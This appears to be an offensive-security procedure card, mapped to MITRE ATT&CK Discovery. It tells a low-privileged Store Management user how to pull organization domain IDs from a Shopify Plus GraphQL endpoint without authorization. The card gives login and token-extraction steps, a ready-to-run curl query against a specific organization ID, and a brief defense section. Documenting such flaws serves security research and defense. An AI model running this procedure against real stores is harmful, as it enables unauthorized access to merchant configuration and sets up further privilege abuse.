---
tags:
  - shopify
  - graphql-query
  - domain-discovery
type: procedure
tools: []
tactics:
  - '[[Discovery]]'
commands:
  - '[[commands/shopify-graphql-query-organization-domains]]'
verified: false
platforms:
  - Web
  - Cloud
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Account Discovery]]'
updated_at: '2025-12-14T17:29:36.329Z'
skill_level: intermediate
impact_level: medium
detection_risk: medium
sub_techniques: []
id: f5b86b56-2300-4cc5-8888-5971a1c67cb1
validated: true
mitre_tactics:
  - '[[Discovery]]'
mitre_techniques:
  - '[[Account Discovery]]'
---
# Query-Domain-ID-as-Low-Privileged-User

## Summary

This procedure uses a low-privileged Store Management user to query the organization's domain IDs via GraphQL, revealing sensitive configuration data that should be protected.

## Description

The GraphQL endpoint /:org_id/stores/api allows Store Management users to query organization domains without proper checks, exposing IDs needed for subsequent unauthorized mutations. This step logs in the low-priv user and executes the query to retrieve the target domain ID.

## Requirements

1. Low-privileged user credentials (Store Management role)
2. Authentication token for API access
3. curl or GraphQL client tool

## Defense

Defensive measures and detection strategies:

- Implement permission-based query filtering in GraphQL resolvers
- Log and alert on domain queries from non-admin roles
- Use introspection disabling and schema restrictions

## Objectives

1. Log in as low-privileged user
2. Retrieve organization domain IDs via GraphQL
3. Identify the target domain for mutation

## Instructions

### Step 1: Log In and Authenticate

**Context**: Access the dashboard to obtain session or token.

Log in to https://shopify.plus/:org_id as the low-priv user and extract the auth token from browser dev tools or cookies.

> Expected output: Valid session with API access.

### Step 2: Execute Domain Query

**Context**: Send GraphQL query to fetch domains.

**Command** ([[commands/shopify-graphql-query-organization-domains]]):
```bash
curl -X POST https://shopify.plus/34946971/stores/api \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer YOUR_TOKEN" \
  -d '{"query":"query{organization{domains{id}}}"}'
```

> This queries the organization for domain IDs. Expected output: JSON with {"data":{"organization":{"domains":[{"id":"GID:::"}]}}}. No errors indicate successful unauthorized access.

## MITRE ATT&CK Mapping

### Tactics

- [[Discovery]] Discovery

### Techniques

- [[Account Discovery]] Account Discovery

### Sub-Techniques


## Commands Used

- [[commands/shopify-graphql-query-organization-domains]]

## Tools Used


## Tags

- graphql
- api-discovery
- unauthorized-query
